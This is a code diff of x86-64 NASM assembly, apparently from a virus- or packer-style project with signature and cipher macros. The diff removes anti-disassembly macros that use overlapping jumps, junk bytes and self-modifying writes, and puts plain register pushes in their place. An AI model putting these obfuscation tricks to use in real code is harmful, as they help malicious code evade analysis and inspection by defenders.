@@ -55,120 +55,24 @@
 
 %define SIGNATURE_OFFSET	signature - _start + 41
 
-
 ; MACROS
-
-%macro OBF_GENERIC 0
-jmp short 0x2
-db 0x0f
-%endmacro
-
-%macro OBF_PUSH_RAX 0
-	jmp short 5
-	push 0x500fDD90
-%endmacro
-
-
-%macro OBF_PUSH_RBX 0
-	jmp short 5
-	push 0x53909090
-%endmacro
-
-%macro OBF_PUSH_RCX 0
-	jmp short 5
-	push 0x5146EEF0
-%endmacro
-
-%macro OBF_PUSH_RDX 0
-	jmp short 6
-	db 0xF8
-	push 0x5246EEF0
-%endmacro
-
-%macro OBF_PUSH_RSI 0
-	jmp short 5
-	db 0xF8
-	dd 0x5646EEF0
-%endmacro
-
-%macro OBF_PUSH_RDI 0
-	jmp short 5
-	db 0x03
-	dd 0x5702EEc0
-%endmacro
-
-%macro OBF_PUSH_RBP 0
-	jmp short 5
-	db 0x03
-	dd 0x55380F66
-%endmacro
-
-%macro OBF_PUSH_RSP 0
-	jmp short 5
-	db 0x03
-	dd 0x543A0F66
-%endmacro
-
-%macro OBF_PUSH_R8 0
-	jmp short 4
-	db 0x02
-	dd 0x5041A0F6
-%endmacro
-
-%macro OBF_OVERWRITE_PUSHR8R9 0
-	OBF_PUSH_R8
-	call .pop
-	.pop:
-	pop r8
-	mov dword[r8+12], 0x51415041
-	pop r8
-	dd 0xADE1F1FF
-%endmacro
-
-%macro OBF_OVERWRITE_PUSHR10R11 0
-	OBF_PUSH_R8
-	call .pop1
-	.pop1:
-	pop r8
-	mov dword[r8+12], 0x53415241
-	pop r8
-	dd 0xFFADE1F1
-%endmacro
-
-%macro OBF_OVERWRITE_PUSHR12R13 0
-	OBF_PUSH_RDI
-	call .pop2
-	.pop2:
-	pop rdi
-	mov dword[rdi+9], 0x55415441
-	pop rdi
-	dd 0xEEA0FDF1
-%endmacro
-
-%macro OBF_OVERWRITE_PUSHR14R15 0
-	OBF_PUSH_RDI
-	call .pop3
-	.pop3:
-	pop rdi
-	mov dword[rdi+9], 0x57415641
-	pop rdi
-	dd 0xEEA0C3F1
-%endmacro
-
 %macro PUSH 0
-	OBF_PUSH_RAX
-	OBF_PUSH_RBX
-	OBF_PUSH_RCX
-	OBF_PUSH_RDX
-	OBF_GENERIC
-	OBF_PUSH_RSI
-	OBF_PUSH_RDI
-	OBF_PUSH_RBP
-	OBF_PUSH_RSP
-	OBF_OVERWRITE_PUSHR8R9
-	OBF_OVERWRITE_PUSHR10R11
-	OBF_OVERWRITE_PUSHR12R13
-	OBF_OVERWRITE_PUSHR14R15
+	push rax
+	push rbx
+	push rcx
+	push rdx
+	push rsi
+	push rdi
+	push rbp
+	push rsp
+	push r8
+	push r9
+	push r10
+	push r11
+	push r12
+	push r13
+	push r14
+	push r15
 %endmacro
 %macro POP 0
 	pop r15
@@ -188,8 +92,6 @@ db 0x0f
 	pop rbx
 	pop rax
 %endmacro
-
-
 
 %macro CYPHER 0
 	xor r11, r11
